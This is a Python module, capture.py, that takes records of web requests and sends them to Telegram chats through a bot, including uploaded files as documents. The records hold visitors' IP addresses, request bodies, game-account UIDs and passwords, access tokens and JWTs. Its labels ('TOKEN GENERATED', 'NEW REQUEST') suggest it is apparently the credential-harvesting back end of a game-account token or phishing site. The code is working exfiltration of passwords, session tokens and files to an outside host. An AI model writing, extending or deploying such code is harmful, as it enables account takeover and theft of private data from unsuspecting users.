# capture.py
import json
import urllib.request
import uuid
from datetime import datetime


def _h(s):
    if s is None:
        return ""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _multipart(fields: dict, files: list):
    boundary = "----capture" + uuid.uuid4().hex
    out = []
    for k, v in fields.items():
        out.append(f"--{boundary}\r\n".encode())
        out.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        out.append(str(v).encode("utf-8"))
        out.append(b"\r\n")
    for f in files:
        out.append(f"--{boundary}\r\n".encode())
        out.append(
            f'Content-Disposition: form-data; name="{f["name"]}"; filename="{f["filename"]}"\r\n'.encode()
        )
        out.append(f'Content-Type: {f.get("content_type", "application/octet-stream")}\r\n\r\n'.encode())
        out.append(f["data"])
        out.append(b"\r\n")
    out.append(f"--{boundary}--\r\n".encode())
    return b"".join(out), f"multipart/form-data; boundary={boundary}"


class TelegramCapture:
    API = "https://api.telegram.org/bot{token}/{method}"

    def __init__(self, bot_token, chat_ids):
        self.token = bot_token or ""
        if isinstance(chat_ids, (str, int)):
            chat_ids = [chat_ids]
        self.chats = [str(c) for c in (chat_ids or [])]

    def send(self, record: dict):
        if not self.token or not self.chats:
            return
        self._send_sync(record)

    def _send_sync(self, record):
        user_files = record.pop("_files", []) or []
        text = self._format(record)

        for chat_id in self.chats:
            try:
                if text.strip():
                    self._message(chat_id, text)
                for f in user_files:
                    self._document(
                        chat_id,
                        filename=f["filename"],
                        data=f["data"],
                        caption=f'📎 {f["filename"]} — {len(f["data"])} bytes',
                        content_type=f.get("content_type", "application/octet-stream"),
                    )
            except Exception as e:
                print(f"[capture:telegram:{chat_id}] {e}")

    # ---------------- formatting ----------------

    def _format(self, r):
        src = r.get("source") or "?"
        icon = {
            "generated":        "✅",
            "generated_failed": "❌",
            "request":          "📥",
        }.get(src, "📌")

        title = {
            "generated":        "TOKEN GENERATED",
            "generated_failed": "TOKEN FAILED",
            "request":          "NEW REQUEST",
        }.get(src, src.upper())

        ts_raw = r.get("ts") or ""
        ts_fmt = ts_raw
        try:
            dt = datetime.fromisoformat(ts_raw.replace("Z", "+00:00"))
            ts_fmt = dt.strftime("%d %b %Y • %H:%M:%S")
        except Exception:
            pass

        def table(rows):
            if not rows:
                return ""
            key_w = max(len(str(k)) for k, _ in rows)
            lines = [f"{str(k).ljust(key_w)}  ›  {v}" for k, v in rows]
            return "<pre>" + "\n".join(lines) + "</pre>"

        L = []

        # header
        L.append(f"{icon}  <b>{_h(title)}</b>")
        L.append(f"<code>{_h(ts_fmt)}</code>")

        # identity
        ident = []
        if r.get("sender"):
            ident.append(f"👤 <b>{_h(r.get('sender'))}</b>")
        if r.get("ip"):
            ident.append(f"🌐 <code>{_h(r.get('ip'))}</code>")
        if ident:
            L.append("")
            L.append("  •  ".join(ident))

        # player (uid + password + level + region)
        player_rows = []
        if r.get("level") not in (None, 0, ""):
            player_rows.append(("Level", str(r.get("level"))))
        if r.get("region"):
            player_rows.append(("Region", str(r.get("region"))))
        if r.get("uid"):
            player_rows.append(("UID", str(r.get("uid"))))
        if r.get("password"):
            player_rows.append(("Password", str(r.get("password"))))
        if player_rows:
            L.append("")
            L.append("🎮  <b>PLAYER</b>")
            L.append(table(player_rows))

        # request
        L.append("")
        L.append("📡  <b>REQUEST</b>")
        req_rows = [
            ("Method", str(r.get("method") or "-")),
            ("Path",   str(r.get("path") or "-")),
        ]
        if r.get("user_agent"):
            req_rows.append(("UA", r.get("user_agent")[:48]))
        if r.get("referer"):
            req_rows.append(("Referer", r.get("referer")[:48]))
        L.append(table(req_rows))

        # query
        q = r.get("query")
        if q and q not in ("{}", "null", "None"):
            L.append("")
            L.append("🔎  <b>QUERY</b>")
            L.append(f"<pre>{_h(q)[:500]}</pre>")

        # body
        b = r.get("body")
        if b:
            L.append("")
            L.append("📨  <b>BODY</b>")
            L.append(f"<pre>{_h(b)[:500]}</pre>")

        # files summary
        if r.get("files_summary"):
            L.append("")
            L.append("📎  <b>FILES</b>")
            L.append(f"<pre>{_h(r.get('files_summary'))[:500]}</pre>")

        # access token
        if r.get("access_token"):
            L.append("")
            L.append("🎟  <b>ACCESS TOKEN</b>")
            L.append(f"<blockquote expandable>{_h(r.get('access_token'))[:900]}</blockquote>")

        # jwt
        if r.get("jwt_token"):
            L.append("")
            L.append("💎  <b>JWT</b>")
            L.append(f"<blockquote expandable>{_h(r.get('jwt_token'))[:1500]}</blockquote>")

        # error
        if r.get("error"):
            L.append("")
            L.append("⚠️  <b>ERROR</b>")
            L.append(f"<blockquote>{_h(r.get('error'))[:500]}</blockquote>")

        L.append("")
        L.append("━━━━━━━━━━━━━━━━━━━━")

        return "\n".join(L)

    # ---------------- api ----------------

    def _api(self, m):
        return self.API.format(token=self.token, method=m)

    def _message(self, chat_id, text):
        chunks, buf, limit = [], "", 4000
        for line in text.split("\n"):
            if len(buf) + len(line) + 1 > limit:
                chunks.append(buf); buf = line
            else:
                buf = (buf + "\n" + line) if buf else line
        if buf: chunks.append(buf)
        for chunk in chunks:
            data = json.dumps({
                "chat_id": chat_id, "text": chunk,
                "parse_mode": "HTML", "disable_web_page_preview": True,
            }).encode()
            req = urllib.request.Request(self._api("sendMessage"), data=data,
                headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=10).read()

    def _document(self, chat_id, filename, data, caption, content_type):
        body, ctype = _multipart(
            fields={"chat_id": chat_id, "caption": caption[:900]},
            files=[{
                "name": "document",
                "filename": filename,
                "data": data,
                "content_type": content_type,
            }],
        )
        req = urllib.request.Request(self._api("sendDocument"), data=body,
            headers={"Content-Type": ctype}, method="POST")
        urllib.request.urlopen(req, timeout=60).read()
